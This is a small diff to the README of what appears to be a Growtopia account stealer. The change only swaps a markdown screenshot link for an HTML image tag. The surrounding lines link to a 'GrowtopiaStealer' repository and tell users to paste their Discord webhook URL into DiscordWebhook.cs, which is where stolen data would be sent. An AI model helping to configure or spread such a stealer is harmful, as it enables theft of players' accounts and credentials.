@@ -8,5 +8,8 @@ Other Version: https://github.com/TheC0mpany/GrowtopiaStealer
 in the file DiscordWebhook.cs on string private static string defaultWebhook = ""; insert your url webhook <br/>
 Also var client = new DiscordWebhookClient(""); insert too
 <br/>
-![ScreenShot](screenshot.png)
+<p>
+    <img src="screenshot.png">
+</p>
+
 
